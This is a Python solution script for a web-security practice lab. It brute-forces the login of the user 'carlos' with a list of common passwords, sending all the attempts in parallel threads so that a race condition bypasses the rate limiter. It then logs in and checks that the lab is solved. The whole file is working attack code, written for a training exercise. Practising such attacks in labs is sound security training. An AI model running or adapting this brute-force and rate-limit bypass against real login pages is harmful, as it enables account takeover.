import sys
import os
import threading
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession
from bs4 import BeautifulSoup

lab = LabSession()

passwords = [
    "123123", "abc123", "football", "monkey", "letmein",
    "shadow", "master", "666666", "qwertyuiop", "123321",
    "mustang", "123456", "password", "12345678", "qwerty",
    "123456789", "12345", "1234", "111111", "1234567",
    "dragon", "1234567890", "michael", "x654321", "superman",
    "1qaz2wsx", "baseball", "7777777", "121212", "000000",
]

# get CSRF token from login page
page = lab.get("/login")
soup = BeautifulSoup(page.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

# send all password attempts in parallel to bypass the rate limiter
# the race condition lets all requests through before the failed-attempt counter increments
correct_password = None
lock = threading.Lock()

def try_login(password):
    global correct_password
    try:
        resp = lab.post("/login", data={
            "csrf": csrf,
            "username": "carlos",
            "password": password,
        }, allow_redirects=False)
        if resp.status_code == 302:
            with lock:
                correct_password = password
    except Exception:
        pass

lab.info("Sending all 30 password attempts in parallel...")
threads = [threading.Thread(target=try_login, args=(pw,)) for pw in passwords]
for t in threads:
    t.start()
for t in threads:
    t.join()

if correct_password:
    lab.success(f"Found password: {correct_password}")
else:
    lab.fail("No password found - rate limit may have triggered")

# log in properly with the correct password
lab.login("carlos", correct_password)

lab.check_solved()
